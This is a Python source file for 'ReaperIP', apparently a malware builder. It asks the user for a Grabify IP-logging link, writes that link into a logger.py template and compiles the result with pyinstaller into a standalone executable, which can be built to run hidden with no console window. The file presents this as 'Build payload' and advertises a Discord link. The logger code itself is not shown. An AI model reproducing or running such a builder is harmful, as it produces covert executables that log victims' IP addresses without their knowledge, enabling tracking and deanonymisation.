from colorama import Fore
import fade
import os
import sys

def set_console_title(text:str):
    sys.stdout.write(f"\x1b]2;{text}\x07")


def main():
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

    set_console_title("ReaperIP | Made by realecstacy. & Janco & JJ | Builder")


    # ========================================================================================================================================================= #

    banner = """
                         ...
                                                                                                                                                                                                                                              
  _____                              _____ _____  
 |  __ \                            |_   _|  __ \ 
 | |__) |___  __ _ _ __   ___ _ __    | | | |__) |
 |  _  // _ \/ _` | '_ \ / _ \ '__|   | | |  ___/ 
 | | \ \  __/ (_| | |_) |  __/ |     _| |_| |     
 |_|  \_\___|\__,_| .__/ \___|_|    |_____|_|     
                  | |                             
                  |_|                             


                                                                    
             ╔═══════════════════════════════╗   ╔═══════════════════════════════╗
             ║ [1] Build payload             ║   ║ [2] Exit                      ║
             ╚═══════════════════════════════╝   ╚═══════════════════════════════╝
                  ╔═════════════════════════╗         ╔═════════════════════════╗
                  ║http://dsc.gg/reaperxyz  ║         ║http://dsc.gg/reaperxyz  ║

    """
    faded_banner = fade.greenblue(banner)
    print(faded_banner)

    choice = input(f"#{Fore.RED}:{Fore.GREEN}>> ")
    if choice == '1':
        link = input(f"Grabify Link{Fore.BLUE}:{Fore.LIGHTCYAN_EX}>> ")
        background = input(f"Should it run in background? (Y/N){Fore.BLUE}: {Fore.LIGHTGREEN_EX}>> ")
        print("Compiling , this might take a while...")
        build_payload(link, background)
    elif choice == '2':
        exit(-1)


def build_payload(link, backkground):
    if backkground == 'Y':
        inset(link)
        os.system('pyinstaller precompile.py --onefile --noconsole')
        print("Done")
        exit(-1)

    elif backkground == 'N':
        inset(link)
        os.system('pyinstaller precompile.py --onefile')
        print("Done")
        exit(-1)
    else:
        print("Background must either be Y or N")
        exit(-1)

def inset(replacement):
    input_file = 'logger.py'
    output_file = 'precompile.py'
    placeholder = '%Url_here%'
    with open(input_file, 'r', encoding='utf-8') as f:  # Specify encoding as 'utf-8'
        file_contents = f.read()
    modified_contents = file_contents.replace(placeholder, replacement)
    with open(output_file, 'w', encoding='utf-8') as f:  # Specify encoding as 'utf-8'
        f.write(modified_contents)

while True:
    main()